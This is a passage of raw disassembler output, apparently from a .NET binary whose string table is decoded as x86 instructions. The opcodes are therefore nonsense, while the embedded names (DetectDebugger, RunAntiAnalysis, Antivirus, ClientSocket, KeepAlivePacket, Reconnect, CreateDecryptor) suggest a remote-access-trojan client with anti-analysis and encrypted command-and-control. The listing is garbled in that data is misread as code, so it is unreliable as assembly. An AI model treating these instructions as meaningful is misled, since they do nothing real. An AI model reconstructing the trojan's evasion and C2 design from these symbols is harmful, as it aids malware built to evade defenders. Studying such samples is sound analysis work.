  40696d:	6e                   	outsb  %ds:(%esi),(%dx)
  40696e:	74 65                	je     0x4069d5
  406970:	67 65 72 00          	addr16 gs jb 0x406974
  406974:	44                   	inc    %esp
  406975:	65 74 65             	gs je  0x4069dd
  406978:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  40697c:	62 75 67             	bound  %esi,0x67(%ebp)
  40697f:	67 65 72 00          	addr16 gs jb 0x406983
  406983:	4d                   	dec    %ebp
  406984:	61                   	popa
  406985:	6e                   	outsb  %ds:(%esi),(%dx)
  406986:	61                   	popa
  406987:	67 65 6d             	gs insl (%dx),%es:(%di)
  40698a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40698c:	74 4f                	je     0x4069dd
  40698e:	62 6a 65             	bound  %ebp,0x65(%edx)
  406991:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  406995:	61                   	popa
  406996:	72 63                	jb     0x4069fb
  406998:	68 65 72 00 53       	push   $0x53007265
  40699d:	65 73 73             	gs jae 0x406a13
  4069a0:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4069a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4069a8:	67 45                	addr16 inc %ebp
  4069aa:	76 65                	jbe    0x406a11
  4069ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4069ad:	74 48                	je     0x4069f7
  4069af:	61                   	popa
  4069b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4069b1:	64 6c                	fs insb (%dx),%es:(%edi)
  4069b3:	65 72 00             	gs jb  0x4069b6
  4069b6:	54                   	push   %esp
  4069b7:	69 6d 65 72 00 43 6c 	imul   $0x6c430072,0x65(%ebp),%ebp
  4069be:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  4069c5:	6c                   	insb   (%dx),%es:(%edi)
  4069c6:	70 65                	jo     0x406a2d
  4069c8:	72 00                	jb     0x4069ca
  4069ca:	54                   	push   %esp
  4069cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4069cc:	55                   	push   %ebp
  4069cd:	70 70                	jo     0x406a3f
  4069cf:	65 72 00             	gs jb  0x4069d2
  4069d2:	44                   	inc    %esp
  4069d3:	65 74 65             	gs je  0x406a3b
  4069d6:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  4069da:	6e                   	outsb  %ds:(%esi),(%dx)
  4069db:	75 66                	jne    0x406a43
  4069dd:	61                   	popa
  4069de:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  4069e2:	65 72 00             	gs jb  0x4069e5
  4069e5:	43                   	inc    %ebx
  4069e6:	75 72                	jne    0x406a5a
  4069e8:	72 65                	jb     0x406a4f
  4069ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4069eb:	74 55                	je     0x406a42
  4069ed:	73 65                	jae    0x406a54
  4069ef:	72 00                	jb     0x4069f1
  4069f1:	53                   	push   %ebx
  4069f2:	74 72                	je     0x406a66
  4069f4:	65 61                	gs popa
  4069f6:	6d                   	insl   (%dx),%es:(%edi)
  4069f7:	57                   	push   %edi
  4069f8:	72 69                	jb     0x406a63
  4069fa:	74 65                	je     0x406a61
  4069fc:	72 00                	jb     0x4069fe
  4069fe:	54                   	push   %esp
  4069ff:	65 78 74             	gs js  0x406a76
  406a02:	57                   	push   %edi
  406a03:	72 69                	jb     0x406a6e
  406a05:	74 65                	je     0x406a6c
  406a07:	72 00                	jb     0x406a09
  406a09:	45                   	inc    %ebp
  406a0a:	6e                   	outsb  %ds:(%esi),(%dx)
  406a0b:	74 65                	je     0x406a72
  406a0d:	72 00                	jb     0x406a0f
  406a0f:	42                   	inc    %edx
  406a10:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  406a17:	72 
  406a18:	74 65                	je     0x406a7f
  406a1a:	72 00                	jb     0x406a1c
  406a1c:	54                   	push   %esp
  406a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  406a1e:	4c                   	dec    %esp
  406a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a20:	77 65                	ja     0x406a87
  406a22:	72 00                	jb     0x406a24
  406a24:	45                   	inc    %ebp
  406a25:	72 72                	jb     0x406a99
  406a27:	6f                   	outsl  %ds:(%esi),(%dx)
  406a28:	72 00                	jb     0x406a2a
  406a2a:	4d                   	dec    %ebp
  406a2b:	61                   	popa
  406a2c:	6e                   	outsb  %ds:(%esi),(%dx)
  406a2d:	61                   	popa
  406a2e:	67 65 6d             	gs insl (%dx),%es:(%di)
  406a31:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a33:	74 4f                	je     0x406a84
  406a35:	62 6a 65             	bound  %ebp,0x65(%edx)
  406a38:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  406a3c:	75 6d                	jne    0x406aab
  406a3e:	65 72 61             	gs jb  0x406aa2
  406a41:	74 6f                	je     0x406ab2
  406a43:	72 00                	jb     0x406a45
  406a45:	47                   	inc    %edi
  406a46:	65 74 45             	gs je  0x406a8e
  406a49:	6e                   	outsb  %ds:(%esi),(%dx)
  406a4a:	75 6d                	jne    0x406ab9
  406a4c:	65 72 61             	gs jb  0x406ab0
  406a4f:	74 6f                	je     0x406ac0
  406a51:	72 00                	jb     0x406a53
  406a53:	41                   	inc    %ecx
  406a54:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406a58:	61                   	popa
  406a59:	74 6f                	je     0x406aca
  406a5b:	72 00                	jb     0x406a5d
  406a5d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  406a62:	00 2e                	add    %ch,(%esi)
  406a64:	63 63 74             	arpl   %esp,0x74(%ebx)
  406a67:	6f                   	outsl  %ds:(%esi),(%dx)
  406a68:	72 00                	jb     0x406a6a
  406a6a:	4d                   	dec    %ebp
  406a6b:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6c:	6e                   	outsb  %ds:(%esi),(%dx)
  406a6d:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  406a74:	65 
  406a75:	61                   	popa
  406a76:	74 65                	je     0x406add
  406a78:	44                   	inc    %esp
  406a79:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406a7d:	70 74                	jo     0x406af3
  406a7f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a80:	72 00                	jb     0x406a82
  406a82:	43                   	inc    %ebx
  406a83:	72 65                	jb     0x406aea
  406a85:	61                   	popa
  406a86:	74 65                	je     0x406aed
  406a88:	45                   	inc    %ebp
  406a89:	6e                   	outsb  %ds:(%esi),(%dx)
  406a8a:	63 72 79             	arpl   %esi,0x79(%edx)
  406a8d:	70 74                	jo     0x406b03
  406a8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a90:	72 00                	jb     0x406a92
  406a92:	49                   	dec    %ecx
  406a93:	6e                   	outsb  %ds:(%esi),(%dx)
  406a94:	74 50                	je     0x406ae6
  406a96:	74 72                	je     0x406b0a
  406a98:	00 53 79             	add    %dl,0x79(%ebx)
  406a9b:	73 74                	jae    0x406b11
  406a9d:	65 6d                	gs insl (%dx),%es:(%edi)
  406a9f:	2e 44                	cs inc %esp
  406aa1:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406aa8:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  406aaf:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  406ab6:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab7:	64 73 00             	fs jae 0x406aba
  406aba:	4d                   	dec    %ebp
  406abb:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406ac2:	74 2e                	je     0x406af2
  406ac4:	56                   	push   %esi
  406ac5:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406acc:	73 69                	jae    0x406b37
  406ace:	63 2e                	arpl   %ebp,(%esi)
  406ad0:	44                   	inc    %esp
  406ad1:	65 76 69             	gs jbe 0x406b3d
  406ad4:	63 65 73             	arpl   %esp,0x73(%ebp)
  406ad7:	00 53 79             	add    %dl,0x79(%ebx)
  406ada:	73 74                	jae    0x406b50
  406adc:	65 6d                	gs insl (%dx),%es:(%edi)
  406ade:	2e 52                	cs push %edx
  406ae0:	75 6e                	jne    0x406b50
  406ae2:	74 69                	je     0x406b4d
  406ae4:	6d                   	insl   (%dx),%es:(%edi)
  406ae5:	65 2e 49             	gs cs dec %ecx
  406ae8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ae9:	74 65                	je     0x406b50
  406aeb:	72 6f                	jb     0x406b5c
  406aed:	70 53                	jo     0x406b42
  406aef:	65 72 76             	gs jb  0x406b68
  406af2:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406af9:	73 74                	jae    0x406b6f
  406afb:	65 6d                	gs insl (%dx),%es:(%edi)
  406afd:	2e 52                	cs push %edx
  406aff:	75 6e                	jne    0x406b6f
  406b01:	74 69                	je     0x406b6c
  406b03:	6d                   	insl   (%dx),%es:(%edi)
  406b04:	65 2e 43             	gs cs inc %ebx
  406b07:	6f                   	outsl  %ds:(%esi),(%dx)
  406b08:	6d                   	insl   (%dx),%es:(%edi)
  406b09:	70 69                	jo     0x406b74
  406b0b:	6c                   	insb   (%dx),%es:(%edi)
  406b0c:	65 72 53             	gs jb  0x406b62
  406b0f:	65 72 76             	gs jb  0x406b88
  406b12:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  406b19:	62 75 67             	bound  %esi,0x67(%ebp)
  406b1c:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  406b23:	65 
  406b24:	73 00                	jae    0x406b26
  406b26:	45                   	inc    %ebp
  406b27:	78 70                	js     0x406b99
  406b29:	61                   	popa
  406b2a:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2b:	64 45                	fs inc %ebp
  406b2d:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2e:	76 69                	jbe    0x406b99
  406b30:	72 6f                	jb     0x406ba1
  406b32:	6e                   	outsb  %ds:(%esi),(%dx)
  406b33:	6d                   	insl   (%dx),%es:(%edi)
  406b34:	65 6e                	outsb  %gs:(%esi),(%dx)
  406b36:	74 56                	je     0x406b8e
  406b38:	61                   	popa
  406b39:	72 69                	jb     0x406ba4
  406b3b:	61                   	popa
  406b3c:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  406b40:	00 47 65             	add    %al,0x65(%edi)
  406b43:	74 50                	je     0x406b95
  406b45:	72 6f                	jb     0x406bb6
  406b47:	63 65 73             	arpl   %esp,0x73(%ebp)
  406b4a:	73 65                	jae    0x406bb1
  406b4c:	73 00                	jae    0x406b4e
  406b4e:	47                   	inc    %edi
  406b4f:	65 74 48             	gs je  0x406b9a
  406b52:	6f                   	outsl  %ds:(%esi),(%dx)
  406b53:	73 74                	jae    0x406bc9
  406b55:	41                   	inc    %ecx
  406b56:	64 64 72 65          	fs fs jb 0x406bbf
  406b5a:	73 73                	jae    0x406bcf
  406b5c:	65 73 00             	gs jae 0x406b5f
  406b5f:	53                   	push   %ebx
  406b60:	79 73                	jns    0x406bd5
  406b62:	74 65                	je     0x406bc9
  406b64:	6d                   	insl   (%dx),%es:(%edi)
  406b65:	2e 53                	cs push %ebx
  406b67:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406b6b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  406b72:	70 
  406b73:	74 6f                	je     0x406be4
  406b75:	67 72 61             	addr16 jb 0x406bd9
  406b78:	70 68                	jo     0x406be2
  406b7a:	79 2e                	jns    0x406baa
  406b7c:	58                   	pop    %eax
  406b7d:	35 30 39 43 65       	xor    $0x65433930,%eax
  406b82:	72 74                	jb     0x406bf8
  406b84:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406b8b:	73 00                	jae    0x406b8d
  406b8d:	45                   	inc    %ebp
  406b8e:	6e                   	outsb  %ds:(%esi),(%dx)
  406b8f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406b92:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  406b96:	74 65                	je     0x406bfd
  406b98:	73 00                	jae    0x406b9a
  406b9a:	52                   	push   %edx
  406b9b:	66 63 32             	arpl   %si,(%edx)
  406b9e:	38 39                	cmp    %bh,(%ecx)
  406ba0:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  406ba4:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  406bab:	73 00                	jae    0x406bad
  406bad:	52                   	push   %edx
  406bae:	65 61                	gs popa
  406bb0:	64 41                	fs inc %ecx
  406bb2:	6c                   	insb   (%dx),%es:(%edi)
  406bb3:	6c                   	insb   (%dx),%es:(%edi)
  406bb4:	42                   	inc    %edx
  406bb5:	79 74                	jns    0x406c2b
  406bb7:	65 73 00             	gs jae 0x406bba
  406bba:	44                   	inc    %esp
  406bbb:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406bbf:	65 46                	gs inc %esi
  406bc1:	72 6f                	jb     0x406c32
  406bc3:	6d                   	insl   (%dx),%es:(%edi)
  406bc4:	42                   	inc    %edx
  406bc5:	79 74                	jns    0x406c3b
  406bc7:	65 73 00             	gs jae 0x406bca
  406bca:	47                   	inc    %edi
  406bcb:	65 74 41             	gs je  0x406c0f
  406bce:	73 42                	jae    0x406c12
  406bd0:	79 74                	jns    0x406c46
  406bd2:	65 73 00             	gs jae 0x406bd5
  406bd5:	47                   	inc    %edi
  406bd6:	65 74 42             	gs je  0x406c1b
  406bd9:	79 74                	jns    0x406c4f
  406bdb:	65 73 00             	gs jae 0x406bde
  406bde:	43                   	inc    %ebx
  406bdf:	53                   	push   %ebx
  406be0:	68 61 72 70 41       	push   $0x41707261
  406be5:	72 67                	jb     0x406c4e
  406be7:	75 6d                	jne    0x406c56
  406be9:	65 6e                	outsb  %gs:(%esi),(%dx)
  406beb:	74 49                	je     0x406c36
  406bed:	6e                   	outsb  %ds:(%esi),(%dx)
  406bee:	66 6f                	outsw  %ds:(%esi),(%dx)
  406bf0:	46                   	inc    %esi
  406bf1:	6c                   	insb   (%dx),%es:(%edi)
  406bf2:	61                   	popa
  406bf3:	67 73 00             	addr16 jae 0x406bf6
  406bf6:	43                   	inc    %ebx
  406bf7:	53                   	push   %ebx
  406bf8:	68 61 72 70 42       	push   $0x42707261
  406bfd:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  406c04:	61                   	popa
  406c05:	67 73 00             	addr16 jae 0x406c08
  406c08:	65 73 46             	gs jae 0x406c51
  406c0b:	6c                   	insb   (%dx),%es:(%edi)
  406c0c:	61                   	popa
  406c0d:	67 73 00             	addr16 jae 0x406c10
  406c10:	53                   	push   %ebx
  406c11:	74 72                	je     0x406c85
  406c13:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  406c1a:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406c21:	65 
  406c22:	53                   	push   %ebx
  406c23:	65 74 74             	gs je  0x406c9a
  406c26:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  406c2d:	73 73                	jae    0x406ca2
  406c2f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406c36:	6e                   	outsb  %ds:(%esi),(%dx)
  406c37:	67 45                	addr16 inc %ebp
  406c39:	76 65                	jbe    0x406ca0
  406c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  406c3c:	74 41                	je     0x406c7f
  406c3e:	72 67                	jb     0x406ca7
  406c40:	73 00                	jae    0x406c42
  406c42:	41                   	inc    %ecx
  406c43:	6e                   	outsb  %ds:(%esi),(%dx)
  406c44:	74 69                	je     0x406caf
  406c46:	5f                   	pop    %edi
  406c47:	41                   	inc    %ecx
  406c48:	6e                   	outsb  %ds:(%esi),(%dx)
  406c49:	61                   	popa
  406c4a:	6c                   	insb   (%dx),%es:(%edi)
  406c4b:	79 73                	jns    0x406cc0
  406c4d:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  406c54:	6e                   	outsb  %ds:(%esi),(%dx)
  406c55:	74 69                	je     0x406cc0
  406c57:	41                   	inc    %ecx
  406c58:	6e                   	outsb  %ds:(%esi),(%dx)
  406c59:	61                   	popa
  406c5a:	6c                   	insb   (%dx),%es:(%edi)
  406c5b:	79 73                	jns    0x406cd0
  406c5d:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  406c64:	73 00                	jae    0x406c66
  406c66:	49                   	dec    %ecx
  406c67:	43                   	inc    %ebx
  406c68:	72 65                	jb     0x406ccf
  406c6a:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406c6d:	74 69                	je     0x406cd8
  406c6f:	61                   	popa
  406c70:	6c                   	insb   (%dx),%es:(%edi)
  406c71:	73 00                	jae    0x406c73
  406c73:	73 65                	jae    0x406cda
  406c75:	74 5f                	je     0x406cd6
  406c77:	43                   	inc    %ebx
  406c78:	72 65                	jb     0x406cdf
  406c7a:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406c7d:	74 69                	je     0x406ce8
  406c7f:	61                   	popa
  406c80:	6c                   	insb   (%dx),%es:(%edi)
  406c81:	73 00                	jae    0x406c83
  406c83:	53                   	push   %ebx
  406c84:	73 6c                	jae    0x406cf2
  406c86:	50                   	push   %eax
  406c87:	72 6f                	jb     0x406cf8
  406c89:	74 6f                	je     0x406cfa
  406c8b:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  406c8e:	73 00                	jae    0x406c90
  406c90:	53                   	push   %ebx
  406c91:	79 73                	jns    0x406d06
  406c93:	74 65                	je     0x406cfa
  406c95:	6d                   	insl   (%dx),%es:(%edi)
  406c96:	2e 57                	cs push %edi
  406c98:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406c9f:	46                   	inc    %esi
  406ca0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ca1:	72 6d                	jb     0x406d10
  406ca3:	73 00                	jae    0x406ca5
  406ca5:	44                   	inc    %esp
  406ca6:	6e                   	outsb  %ds:(%esi),(%dx)
  406ca7:	73 00                	jae    0x406ca9
  406ca9:	43                   	inc    %ebx
  406caa:	6f                   	outsl  %ds:(%esi),(%dx)
  406cab:	6e                   	outsb  %ds:(%esi),(%dx)
  406cac:	74 61                	je     0x406d0f
  406cae:	69 6e 73 00 53 74 72 	imul   $0x72745300,0x73(%esi),%ebp
  406cb5:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  406cbc:	74 4f                	je     0x406d0d
  406cbe:	70 74                	jo     0x406d34
  406cc0:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  406cc7:	74 49                	je     0x406d12
  406cc9:	6d                   	insl   (%dx),%es:(%edi)
  406cca:	61                   	popa
  406ccb:	67 65 44             	addr16 gs inc %esp
  406cce:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406cd2:	65 72 73             	gs jb  0x406d48
  406cd5:	00 52 75             	add    %dl,0x75(%edx)
  406cd8:	6e                   	outsb  %ds:(%esi),(%dx)
  406cd9:	74 69                	je     0x406d44
  406cdb:	6d                   	insl   (%dx),%es:(%edi)
  406cdc:	65 48                	gs dec %eax
  406cde:	65 6c                	gs insb (%dx),%es:(%edi)
  406ce0:	70 65                	jo     0x406d47
  406ce2:	72 73                	jb     0x406d57
  406ce4:	00 53 73             	add    %dl,0x73(%ebx)
  406ce7:	6c                   	insb   (%dx),%es:(%edi)
  406ce8:	50                   	push   %eax
  406ce9:	6f                   	outsl  %ds:(%esi),(%dx)
  406cea:	6c                   	insb   (%dx),%es:(%edi)
  406ceb:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406cf2:	72 73                	jb     0x406d67
  406cf4:	00 73 73             	add    %dh,0x73(%ebx)
  406cf7:	6c                   	insb   (%dx),%es:(%edi)
  406cf8:	50                   	push   %eax
  406cf9:	6f                   	outsl  %ds:(%esi),(%dx)
  406cfa:	6c                   	insb   (%dx),%es:(%edi)
  406cfb:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406d02:	72 73                	jb     0x406d77
  406d04:	00 68 50             	add    %ch,0x50(%eax)
  406d07:	72 6f                	jb     0x406d78
  406d09:	63 65 73             	arpl   %esp,0x73(%ebp)
  406d0c:	73 00                	jae    0x406d0e
  406d0e:	47                   	inc    %edi
  406d0f:	65 74 43             	gs je  0x406d55
  406d12:	75 72                	jne    0x406d86
  406d14:	72 65                	jb     0x406d7b
  406d16:	6e                   	outsb  %ds:(%esi),(%dx)
  406d17:	74 50                	je     0x406d69
  406d19:	72 6f                	jb     0x406d8a
  406d1b:	63 65 73             	arpl   %esp,0x73(%ebp)
  406d1e:	73 00                	jae    0x406d20
  406d20:	49                   	dec    %ecx
  406d21:	50                   	push   %eax
  406d22:	41                   	inc    %ecx
  406d23:	64 64 72 65          	fs fs jb 0x406d8c
  406d27:	73 73                	jae    0x406d9c
  406d29:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  406d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d2e:	6d                   	insl   (%dx),%es:(%edi)
  406d2f:	70 72                	jo     0x406da3
  406d31:	65 73 73             	gs jae 0x406da7
  406d34:	00 53 79             	add    %dl,0x79(%ebx)
  406d37:	73 74                	jae    0x406dad
  406d39:	65 6d                	gs insl (%dx),%es:(%edi)
  406d3b:	2e 4e                	cs dec %esi
  406d3d:	65 74 2e             	gs je  0x406d6e
  406d40:	53                   	push   %ebx
  406d41:	6f                   	outsl  %ds:(%esi),(%dx)
  406d42:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406d45:	74 73                	je     0x406dba
  406d47:	00 73 65             	add    %dh,0x65(%ebx)
  406d4a:	74 5f                	je     0x406dab
  406d4c:	41                   	inc    %ecx
  406d4d:	72 67                	jb     0x406db6
  406d4f:	75 6d                	jne    0x406dbe
  406d51:	65 6e                	outsb  %gs:(%esi),(%dx)
  406d53:	74 73                	je     0x406dc8
  406d55:	00 53 79             	add    %dl,0x79(%ebx)
  406d58:	73 74                	jae    0x406dce
  406d5a:	65 6d                	gs insl (%dx),%es:(%edi)
  406d5c:	45                   	inc    %ebp
  406d5d:	76 65                	jbe    0x406dc4
  406d5f:	6e                   	outsb  %ds:(%esi),(%dx)
  406d60:	74 73                	je     0x406dd5
  406d62:	00 50 6f             	add    %dl,0x6f(%eax)
  406d65:	72 74                	jb     0x406ddb
  406d67:	73 00                	jae    0x406d69
  406d69:	45                   	inc    %ebp
  406d6a:	78 69                	js     0x406dd5
  406d6c:	73 74                	jae    0x406de2
  406d6e:	73 00                	jae    0x406d70
  406d70:	48                   	dec    %eax
  406d71:	6f                   	outsl  %ds:(%esi),(%dx)
  406d72:	73 74                	jae    0x406de8
  406d74:	73 00                	jae    0x406d76
  406d76:	41                   	inc    %ecx
  406d77:	6e                   	outsb  %ds:(%esi),(%dx)
  406d78:	74 69                	je     0x406de3
  406d7a:	76 69                	jbe    0x406de5
  406d7c:	72 75                	jb     0x406df3
  406d7e:	73 00                	jae    0x406d80
  406d80:	43                   	inc    %ebx
  406d81:	6f                   	outsl  %ds:(%esi),(%dx)
  406d82:	6e                   	outsb  %ds:(%esi),(%dx)
  406d83:	63 61 74             	arpl   %esp,0x74(%ecx)
  406d86:	00 49 6d             	add    %cl,0x6d(%ecx)
  406d89:	61                   	popa
  406d8a:	67 65 46             	addr16 gs inc %esi
  406d8d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d8e:	72 6d                	jb     0x406dfd
  406d90:	61                   	popa
  406d91:	74 00                	je     0x406d93
  406d93:	66 6f                	outsw  %ds:(%esi),(%dx)
  406d95:	72 6d                	jb     0x406e04
  406d97:	61                   	popa
  406d98:	74 00                	je     0x406d9a
  406d9a:	4d                   	dec    %ebp
  406d9b:	61                   	popa
  406d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  406d9d:	61                   	popa
  406d9e:	67 65 6d             	gs insl (%dx),%es:(%di)
  406da1:	65 6e                	outsb  %gs:(%esi),(%dx)
  406da3:	74 42                	je     0x406de7
  406da5:	61                   	popa
  406da6:	73 65                	jae    0x406e0d
  406da8:	4f                   	dec    %edi
  406da9:	62 6a 65             	bound  %ebp,0x65(%edx)
  406dac:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  406db0:	6f                   	outsl  %ds:(%esi),(%dx)
  406db1:	72 63                	jb     0x406e16
  406db3:	65 50                	gs push %eax
  406db5:	61                   	popa
  406db6:	74 68                	je     0x406e20
  406db8:	4f                   	dec    %edi
  406db9:	62 6a 65             	bound  %ebp,0x65(%edx)
  406dbc:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406dc0:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc1:	6c                   	insb   (%dx),%es:(%edi)
  406dc2:	6c                   	insb   (%dx),%es:(%edi)
  406dc3:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  406dc8:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc9:	6e                   	outsb  %ds:(%esi),(%dx)
  406dca:	6e                   	outsb  %ds:(%esi),(%dx)
  406dcb:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  406dd0:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  406dd4:	6e                   	outsb  %ds:(%esi),(%dx)
  406dd5:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  406dda:	65 74 00             	gs je  0x406ddd
  406ddd:	53                   	push   %ebx
  406dde:	79 73                	jns    0x406e53
  406de0:	74 65                	je     0x406e47
  406de2:	6d                   	insl   (%dx),%es:(%edi)
  406de3:	2e 4e                	cs dec %esi
  406de5:	65 74 00             	gs je  0x406de8
  406de8:	53                   	push   %ebx
  406de9:	65 74 00             	gs je  0x406dec
  406dec:	54                   	push   %esp
  406ded:	61                   	popa
  406dee:	72 67                	jb     0x406e57
  406df0:	65 74 00             	gs je  0x406df3
  406df3:	43                   	inc    %ebx
  406df4:	6c                   	insb   (%dx),%es:(%edi)
  406df5:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  406dfc:	6e                   	outsb  %ds:(%esi),(%dx)
  406dfd:	64 6c                	fs insb (%dx),%es:(%edi)
  406dff:	65 5f                	gs pop %edi
  406e01:	50                   	push   %eax
  406e02:	61                   	popa
  406e03:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406e06:	74 00                	je     0x406e08
  406e08:	4b                   	dec    %ebx
  406e09:	65 65 70 41          	gs gs jo 0x406e4e
  406e0d:	6c                   	insb   (%dx),%es:(%edi)
  406e0e:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  406e15:	65 74 00             	gs je  0x406e18
  406e18:	43                   	inc    %ebx
  406e19:	6c                   	insb   (%dx),%es:(%edi)
  406e1a:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  406e21:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  406e25:	67 65 74 5f          	addr16 gs je 0x406e88
  406e29:	4f                   	dec    %edi
  406e2a:	66 66 73 65          	data16 data16 jae 0x406e93
  406e2e:	74 00                	je     0x406e30
  406e30:	73 65                	jae    0x406e97
  406e32:	74 5f                	je     0x406e93
  406e34:	4f                   	dec    %edi
  406e35:	66 66 73 65          	data16 data16 jae 0x406e9e
  406e39:	74 00                	je     0x406e3b
  406e3b:	53                   	push   %ebx
  406e3c:	70 6c                	jo     0x406eaa
  406e3e:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  406e45:	6e 
  406e46:	74 4f                	je     0x406e97
  406e48:	6e                   	outsb  %ds:(%esi),(%dx)
  406e49:	45                   	inc    %ebp
  406e4a:	78 69                	js     0x406eb5
  406e4c:	74 00                	je     0x406e4e
  406e4e:	53                   	push   %ebx
  406e4f:	61                   	popa
  406e50:	6c                   	insb   (%dx),%es:(%edi)
  406e51:	74 00                	je     0x406e53
  406e53:	49                   	dec    %ecx
  406e54:	41                   	inc    %ecx
  406e55:	73 79                	jae    0x406ed0
  406e57:	6e                   	outsb  %ds:(%esi),(%dx)
  406e58:	63 52 65             	arpl   %edx,0x65(%edx)
  406e5b:	73 75                	jae    0x406ed2
  406e5d:	6c                   	insb   (%dx),%es:(%edi)
  406e5e:	74 00                	je     0x406e60
  406e60:	54                   	push   %esp
  406e61:	6f                   	outsl  %ds:(%esi),(%dx)
  406e62:	55                   	push   %ebp
  406e63:	70 70                	jo     0x406ed5
  406e65:	65 72 49             	gs jb  0x406eb1
  406e68:	6e                   	outsb  %ds:(%esi),(%dx)
  406e69:	76 61                	jbe    0x406ecc
  406e6b:	72 69                	jb     0x406ed6
  406e6d:	61                   	popa
  406e6e:	6e                   	outsb  %ds:(%esi),(%dx)
  406e6f:	74 00                	je     0x406e71
  406e71:	57                   	push   %edi
  406e72:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  406e76:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  406e7d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406e84:	65 
  406e85:	43                   	inc    %ebx
